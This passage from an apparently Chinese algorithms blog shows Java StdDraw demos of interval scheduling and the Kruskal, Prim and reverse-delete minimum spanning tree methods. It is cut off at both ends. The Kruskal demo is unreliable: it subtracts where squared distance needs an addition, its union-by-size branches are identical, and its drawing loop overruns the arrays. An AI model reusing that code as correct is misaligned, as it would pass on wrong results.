class="hljs-number">0</span>;<br><br>        <span class="hljs-type">int</span> i;<br>        <span class="hljs-type">int</span> j;<br>        <span class="hljs-keyword">while</span>(c &lt; isN) {<br>            i = (<span class="hljs-type">int</span>)(Math.random() * (<span class="hljs-type">double</span>)beishu);<br>            j = (<span class="hljs-type">int</span>)(Math.random() * (<span class="hljs-type">double</span>)beishu);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">d3</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>)(Math.random() * (<span class="hljs-type">double</span>)beishu);<br>            <span class="hljs-keyword">if</span> (i &gt; j) {<br>                isS[c] = j;<br>                isF[c] = i;<br>                isF2[c] = i;<br>                isY[c] = d3;<br>                isR[c] = <span class="hljs-number">1</span>;<br>                flagX[c] = <span class="hljs-number">1</span>;<br>                ++c;<br>            }<br>        }<br><br>        StdDraw.setXscale(<span class="hljs-number">0.0</span>, (<span class="hljs-type">double</span>)beishu);<br>        StdDraw.setYscale(<span class="hljs-number">0.0</span>, (<span class="hljs-type">double</span>)beishu);<br>        StdDraw.setPenRadius(<span class="hljs-number">0.005</span>);<br>        Arrays.sort(isF);<br><br>        <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; isN; ++i) {<br>            <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; isN; ++j) {<br>                <span class="hljs-keyword">if</span> (isF[i] == isF2[j] &amp;&amp; flagX[j] == <span class="hljs-number">1</span>) {<br>                    isS2[i] = isS[j];<br>                    isY2[i] = isY[j];<br>                    flagX[j] = <span class="hljs-number">0</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                }<br>            }<br>        }<br><br>        <span class="hljs-keyword">for</span>(c = <span class="hljs-number">0</span>; c &lt; isN; ++c) {<br>            <span class="hljs-keyword">if</span> (isR[c] == <span class="hljs-number">1</span>) {<br>                <span class="hljs-keyword">for</span>(i = c + <span class="hljs-number">1</span>; i &lt; isN; ++i) {<br>                    <span class="hljs-keyword">if</span> (isS2[i] &lt; isF[c]) {<br>                        isR[i] = <span class="hljs-number">0</span>;<br>                    }<br>                }<br>            }<br>        }<br><br>        <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; isN; ++i) {<br>            <span class="hljs-keyword">if</span> (isR[i] == <span class="hljs-number">1</span>) {<br>                StdDraw.setPenColor(StdDraw.RED);<br>                StdDraw.line((<span class="hljs-type">double</span>)isS2[i], (<span class="hljs-type">double</span>)isY2[i], (<span class="hljs-type">double</span>)isF[i], (<span class="hljs-type">double</span>)isY2[i]);<br>            } <span class="hljs-keyword">else</span> {<br>                StdDraw.setPenColor(StdDraw.BLACK);<br>                StdDraw.line((<span class="hljs-type">double</span>)isS2[i], (<span class="hljs-type">double</span>)isY2[i], (<span class="hljs-type">double</span>)isF[i], (<span class="hljs-type">double</span>)isY2[i]);<br>            }<br>        }<br><br>    }<br>}<br><br></code></pre></td></tr></tbody></table></figure><h3 id="最小生成树"><a href="#最小生成树" class="headerlink" title="最小生成树"></a>最小生成树</h3><h4 id="kru"><a href="#kru" class="headerlink" title="kru"></a>kru</h4><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">KruskalDemo2</span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] arrays)</span>{<br>        <span class="hljs-type">int</span> VN=<span class="hljs-number">9</span>,eN=<span class="hljs-number">17</span>,count;<br>        count=VN;<br>        <span class="hljs-type">int</span>[] cN=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[VN];<br>        <span class="hljs-type">int</span>[] cS=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[VN];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;VN;i++){<br>            cN[i]=i;<br>            cS[i]=<span class="hljs-number">1</span>;<br>        }<br>        <span class="hljs-type">int</span>[] c=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-type">int</span>[] c2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-type">int</span>[] flagEOG=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-type">int</span>[][]<br>                e={{<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>},{<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">8</span>}};<br>        <span class="hljs-type">int</span> N=VN;<br>        <span class="hljs-type">int</span> beishu=<span class="hljs-number">9</span>;<br>        <span class="hljs-type">int</span>[] x={<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">3</span>};<br>        <span class="hljs-type">int</span>[] y={<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>};<br>        StdDraw.setXscale(<span class="hljs-number">0</span>,beishu);<br>        StdDraw.setYscale(<span class="hljs-number">0</span>,beishu);<br>        StdDraw.setPenRadius(<span class="hljs-number">0.005</span>);<br>        <span class="hljs-type">int</span> v3;<br>        <span class="hljs-type">int</span> v4;<br>        <span class="hljs-type">int</span>[][] e2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][eN];<br>        <span class="hljs-type">int</span>[] flagX=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;eN;i++)<br>        {<br>            v3=e[<span class="hljs-number">0</span>][i];<br>            v4=e[<span class="hljs-number">1</span>][i];<br>            flagX[i]=<span class="hljs-number">1</span>;<br>            c[i]=(x[v3]-x[v4])*(x[v3]-x[v4])-(y[v3]-y[v4])*(y[v3]-y[v4]);<br>            c2[i]=c[i];<br>            flagEOG[i]=<span class="hljs-number">0</span>;<br>        }<br>        Arrays.sort(c);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;eN;i++){<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;eN;j++){<br>                <span class="hljs-keyword">if</span>(c[i]==c2[j]&amp;&amp;flagX[j]==<span class="hljs-number">1</span>){<br>                    e2[<span class="hljs-number">0</span>][i]=e[<span class="hljs-number">0</span>][j];<br>                    e2[<span class="hljs-number">1</span>][i]=e[<span class="hljs-number">1</span>][j];<br>                    flagX[j]=<span class="hljs-number">0</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                }<br>            }<br>        }<br>        <span class="hljs-type">int</span> clb=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (count&gt;=<span class="hljs-number">1</span>){<br>            <span class="hljs-keyword">if</span> (count==<span class="hljs-number">1</span>){<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=eN;i++){<br>                    <span class="hljs-type">int</span> v1,v2;<br>                    v1=e2[<span class="hljs-number">0</span>][i];<br>                    v2=e2[<span class="hljs-number">1</span>][i];<br>                    <span class="hljs-keyword">if</span>(flagEOG[i]==<span class="hljs-number">1</span>){<br>                        StdDraw.setPenColor(StdDraw.RED);<br>                        StdDraw.line(x[v1],y[v1],x[v2],y[v2]);<br>                    }<br>                    <span class="hljs-keyword">else</span>{<br>                        StdDraw.setPenColor(StdDraw.BLACK);<br>                        StdDraw.line(x[v1],y[v1],x[v2],y[v2]);<br>                    }<br>                }<br>                <span class="hljs-keyword">break</span>;<br>            }<br>            <span class="hljs-type">int</span> szj1,szj2;<br>            szj1=cN[e2[<span class="hljs-number">0</span>][clb]];<br>            szj2=cN[e2[<span class="hljs-number">1</span>][clb]];<br>            <span class="hljs-keyword">if</span>(szj1!=szj2){<br>                flagEOG[clb]=<span class="hljs-number">1</span>;<br>                count=count-<span class="hljs-number">1</span>;<br>                <span class="hljs-type">int</span> dd,xd;<br>                <span class="hljs-keyword">if</span> (cS[szj1]&gt;=cS[szj2]){<br>                    dd=szj1;<br>                    xd=szj2;<br>                }<br>                <span class="hljs-keyword">else</span> {<br>                    dd=szj1;<br>                    xd=szj2;<br>                }<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;k&lt;VN;k++){<br>                    <span class="hljs-keyword">if</span>(cN[k]==dd){<br>                        cS[dd]=cS[dd]+cS[xd];<br>                    }<br>                }<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;k&lt;VN;k++){<br>                    <span class="hljs-keyword">if</span>(cN[k]==xd){<br>                        cN[k]=dd;<br>                    }<br>                }<br>            }<br>            clb=clb+<span class="hljs-number">1</span>;<br>        }<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="prim"><a href="#prim" class="headerlink" title="prim"></a>prim</h4><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PrimDemo</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        <span class="hljs-type">int</span> vN=<span class="hljs-number">9</span>,eN=<span class="hljs-number">17</span>,count;<br>        count = vN;<br>        <span class="hljs-type">int</span>[] cN=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[vN];<br>        <span class="hljs-type">int</span>[] cS=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[vN];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;vN;i++){<br>            cN[i]=i;<br>            cS[i]=<span class="hljs-number">1</span>;<br>        }<br>        <span class="hljs-type">int</span>[] c=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-type">int</span>[] c2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-type">int</span>[] flagEOG=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-type">int</span>[] flagVOG=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[vN];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;vN;i++){<br>            flagVOG[i]=<span class="hljs-number">0</span>;<br>        }<br>        <span class="hljs-type">int</span>[][] e ={{<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>},{<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">8</span>}};<br>        <span class="hljs-type">int</span> N=vN;<br>        <span class="hljs-type">int</span> beishu=<span class="hljs-number">9</span>;<br>        <span class="hljs-type">int</span>[] x={<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">3</span>};<br>        <span class="hljs-type">int</span>[] y={<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>};<br>        StdDraw.setXscale(<span class="hljs-number">0</span>,beishu);<br>        StdDraw.setYscale(<span class="hljs-number">0</span>,beishu);<br>        StdDraw.setPenRadius(<span class="hljs-number">0.005</span>);<br>        <span class="hljs-type">int</span> v3;<br>        <span class="hljs-type">int</span> v4;<br>        <span class="hljs-type">int</span>[][] e2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][eN];<br>        <span class="hljs-type">int</span>[] flagX=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;eN;i++){<br>            v3=e[<span class="hljs-number">0</span>][i];<br>            v4=e[<span class="hljs-number">1</span>][i];<br>            flagX[i]=<span class="hljs-number">1</span>;<br>            c[i]=(x[v3]-x[v4])*(x[v3]-x[v4])+(y[v3]-y[v4])*(y[v3]-y[v4]);<br>            c2[i]=c[i];<br>            flagEOG[i]=<span class="hljs-number">0</span>;<br>        }<br>        Arrays.sort(c);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;eN;i++){<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;eN;j++){<br>                <span class="hljs-keyword">if</span>(c[i]==c2[j]&amp;&amp;flagX[j]==<span class="hljs-number">1</span>){<br>                    e2[<span class="hljs-number">0</span>][i]=e[<span class="hljs-number">0</span>][j];<br>                    e2[<span class="hljs-number">1</span>][i]=e[<span class="hljs-number">1</span>][j];<br>                    flagX[j]=<span class="hljs-number">0</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                }<br>            }<br>        }<br>        <span class="hljs-type">int</span> fV=(<span class="hljs-type">int</span>)(Math.random()*vN);<br>        flagVOG[fV]=<span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> szj1,szj2;<br>        <span class="hljs-keyword">while</span> (count&gt;=<span class="hljs-number">1</span>){<br>            <span class="hljs-keyword">if</span>(count==<span class="hljs-number">1</span>){<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;eN;i++){<br>                    <span class="hljs-type">int</span> v1,v2;<br>                    v1=e2[<span class="hljs-number">0</span>][i];<br>                    v2=e2[<span class="hljs-number">1</span>][i];<br><br>                    <span class="hljs-keyword">if</span>(flagEOG[i]==<span class="hljs-number">1</span>){<br>                        StdDraw.setPenColor(StdDraw.RED);<br>                        StdDraw.line(x[v1],y[v1],x[v2],y[v2]);<br>                    }<br>                    <span class="hljs-keyword">else</span> {<br>                        StdDraw.setPenColor(StdDraw.BLACK);<br>                        StdDraw.line(x[v1],y[v1],x[v2],y[v2]);<br>                    }<br>                }<br>                <span class="hljs-keyword">break</span>;<br>            }<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;k&lt;eN;k++){<br>                szj1=e2[<span class="hljs-number">0</span>][k];<br>                szj2=e2[<span class="hljs-number">1</span>][k];<br>                <span class="hljs-keyword">if</span>(flagEOG[k]==<span class="hljs-number">0</span>&amp;&amp;((flagVOG[szj2]==<span class="hljs-number">0</span>&amp;&amp;flagVOG[szj1]==<span class="hljs-number">1</span>)||(flagVOG[szj2]==<span class="hljs-number">1</span>&amp;&amp;flagVOG[szj1]==<span class="hljs-number">0</span>))){<br>                    flagEOG[k]=<span class="hljs-number">1</span>;<br>                    <span class="hljs-keyword">if</span>(flagVOG[szj2]==<span class="hljs-number">0</span>){<br>                        flagVOG[szj2]=<span class="hljs-number">1</span>;<br>                    }<br>                    <span class="hljs-keyword">else</span> {<br>                        flagVOG[szj1]=<span class="hljs-number">1</span>;<br>                    }<br>                    count--;<br>                    <span class="hljs-keyword">break</span>;<br>                }<br>            }<br>        }<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="反向删除"><a href="#反向删除" class="headerlink" title="反向删除"></a>反向删除</h4><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReverseDeleteDemo</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        <span class="hljs-type">int</span> <span class="hljs-variable">vN</span> <span class="hljs-operator">=</span> <span class="hljs-number">9</span>, eN = <span class="hljs-number">17</span>, count;<br>        count = vN;<br>        <span class="hljs-type">int</span>[] c = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-type">int</span>[] flagv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[vN];<br>        <span class="hljs-type">int</span>[] c2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-type">int</span>[] flagEOG = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-type">int</span>[][] e = {{<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>}, {<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>}};<br>        <span class="hljs-type">int</span>[][] flag = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[vN][vN];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">N</span> <span class="hljs-operator">=</span> vN;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">beishu</span> <span class="hljs-operator">=</span> <span class="hljs-number">9</span>;<br>        <span class="hljs-type">int</span>[] x = {<span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>};<br>        <span class="hljs-type">int</span>[] y = {<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>};<br>        StdDraw.setXscale(<span class="hljs-number">0</span>, beishu);<br>        StdDraw.setYscale(<span class="hljs-number">0</span>, beishu);<br>        StdDraw.setPenRadius(<span class="hljs-number">0.005</span>);<br>        <span class="hljs-type">int</span> v3;<br>        <span class="hljs-type">int</span> v4;<br>        <span class="hljs-type">int</span>[][] e2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][eN];<br>        <span class="hljs-type">int</span>[] flagX = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[eN];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; eN; i++) {<br>            v3 = e[<span class="hljs-number">0</span>][i];<br>            v4 = e[<span class="hljs-number">1</span>][i];<br>            flagX[i] = <span class="hljs-number">1</span>;<br>            c[i] = (x[v3] - x[v4]) * (x[v3] - x[v4]) + (y[v3] - y[v4]) * (y[v3] - y[v4]);<br>            c2[i] = c[i];<br>            flagEOG[i] = <span class="hljs-number">1</span>;<br>        }<br>        Arrays.sort(c);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; eN; i++) {<br>            flag[e[<span class="hljs-number">0</span>][i]][e[<span class="hljs-number">1</span>][i]] = <span class="hljs-number">1</span>;<br>            flag[e[<span class="hljs-number">1</span>][i]][e[<span class="hljs-number">0</span>][i]] = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; eN; j++) {<br>                <span class="hljs-keyword">if</span> (c[i] == c2[j] &amp;&amp; flagX[j] == <span class="hljs-number">1</span>) {<br>                    e2[<span class="hljs-number">0</span>][i] = e[<span class="hljs-number">0</span>][j];<br>                    e2[<span class="hljs-number">1</span>][i] = e[<span class="hljs-number">1</span>][j];<br>                    flagX[j] = <span class="hljs-number">0</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                }<br>            }<br>        }<br>        <span class="hljs-type">int</span> szj1, szj2;<br>        <span class="hljs-keyword">while</span> (count &gt;= <span class="hljs-number">1</span>) {<br>            <span class="hljs-keyword">if</span> (count == <span class="hljs-number">1</span>) {<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; eN; i++) {<br>                    <span class="hljs-type">int</span> v1, v2;<br>                    v1 